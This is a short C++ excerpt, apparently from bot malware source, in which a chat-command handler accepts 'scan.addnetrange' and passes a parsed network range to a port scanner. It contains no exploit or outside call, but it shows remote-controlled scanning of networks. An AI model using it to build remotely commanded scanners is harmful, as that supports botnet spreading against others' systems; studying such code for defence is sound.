bool CScanner::HandleCommand(CMessage *pMsg) {
  /* ... OMITTED ... */
  if (!pMsg->sCmd.Compare("scan.addnetrange")) {
    CString sNetRange = pMsg->sChatString.Token(1, " ");
    CString sPriority = pMsg->sChatString.Token(2, " ");
    /* ... OMITTED ... */
    if (ParseNetRange(sNetRange, nRange))
      m_cPortScanner.RegisterNetRange(&nRange);
  }
  /* ... OMITTED ... */
}

bool ParseNetRange(const CString &sInput, CNetRange &nRange) {
  // Netrange is never longer than 18 characters
  if (sInput.GetLength() > 18)
    return false;
  // Get temp storage and copy the string
  char *szTemp = new char[sInput.GetLength() + 2];
  sprintf(szTemp, "%s", sInput.CStr());
  // Get number of dots and slashes in the string
  int iDotCount = 0, iSlashCount = 0;
  for (int i = 0; i < strlen(szTemp); i++) {
    if (szTemp[i] == '.') iDotCount++;
    else if (szTemp[i] == '/') iSlashCount++;
  }
  // If there are no 3 dots or there is no slash, fail
  if (iDotCount != 3) {delete[] szTemp; return false; }
  if (iSlashCount != 1) {delete[] szTemp; return false; }
  // Make a copy of the string into a CString and parse it
  CString sTemp(szTemp);
  nRange.iPart1 = atoi(sTemp.Token(0, "/").Token(0, ".").CStr());
  nRange.iPart2 = atoi(sTemp.Token(0, "/").Token(1, ".").CStr());
  nRange.iPart3 = atoi(sTemp.Token(0, "/").Token(2, ".").CStr());
  nRange.iPart4 = atoi(sTemp.Token(0, "/").Token(3, ".").CStr());
  nRange.iNetMask = atoi(sTemp.Token(1, "/").CStr());
  // Fail if the parts are 0
  if (!nRange.iPart1 && !nRange.iPart2 && !nRange.iPart3 && !nRange.iPart4) {
    delete[] szTemp; return false; }
  // Fail if the netmask is not a multiple of 8
  if ((nRange.iNetMask % 8) != 0) {delete[] szTemp; return false; }
  // Success
  delete[] szTemp; return true;
}